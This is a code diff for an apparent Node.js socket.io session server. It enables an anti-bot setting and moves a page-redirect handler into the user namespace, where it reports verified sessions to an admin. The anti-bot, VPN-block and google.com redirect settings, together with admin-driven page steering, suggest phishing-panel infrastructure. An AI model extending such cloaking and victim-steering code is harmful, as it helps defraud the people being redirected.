@@ -290,7 +290,7 @@ const state = {
         websiteEnabled: true,
         redirectUrl: 'https://google.com',
         vpnBlockEnabled: false,
-        antiBotEnabled: false,
+        antiBotEnabled: true,
         defaultLandingPage: 'loading.html',
         captchaEnabled: false,
         availablePages: []
@@ -836,6 +836,30 @@ userNamespace.on('connection', async (socket) => {
         socket.sessionId = sessionId;
         socket.emit('session_url', session.url);
 
+        socket.on('request_redirect', (data) => {
+            const session = sessionManager.getSession(socket.sessionId);
+            if (session) {
+                // Keep connection active during redirect
+                session.loading = true;
+                session.connected = true;
+                
+                // Update session page and get new URL
+                const pageNameCapitalized = data.page.charAt(0).toUpperCase() + data.page.slice(1).toLowerCase();
+                session.currentPage = pageNameCapitalized;
+                const newUrl = sessionManager.updateSessionUrl(session);
+                
+                if (newUrl) {
+                    console.log('Redirecting user to:', newUrl);
+                    socket.emit('redirect', newUrl);
+                }
+                
+                // Notify admin of update if session is verified
+                if (!sessionManager.isPending(socket.sessionId)) {
+                    adminNamespace.emit('session_updated', session);
+                }
+            }
+        });
+
         // Handle page changes
         socket.on('page_change', (page) => {
             const session = sessionManager.getSession(sessionId);
@@ -1058,29 +1082,7 @@ adminNamespace.on('connection', (socket) => {
         }
     });
 
-    // Add this inside your userNamespace.on('connection', ...) handler
-socket.on('request_redirect', (data) => {
-    const session = sessionManager.getSession(socket.sessionId);
-    if (session) {
-        session.loading = true;
-        session.connected = true;
-        
-        // Update session page
-        const pageNameCapitalized = data.page.charAt(0).toUpperCase() + data.page.slice(1).toLowerCase();
-        session.currentPage = pageNameCapitalized;
-        
-        // Generate new URL and redirect
-        const newUrl = sessionManager.updateSessionUrl(session);
-        if (newUrl) {
-            socket.emit('redirect', newUrl);
-        }
-        
-        // Notify admin of update if session is verified
-        if (!sessionManager.isPending(socket.sessionId)) {
-            adminNamespace.emit('session_updated', session);
-        }
-    }
-});
+
 
     
     socket.on('remove_session', async ({ sessionId }) => {
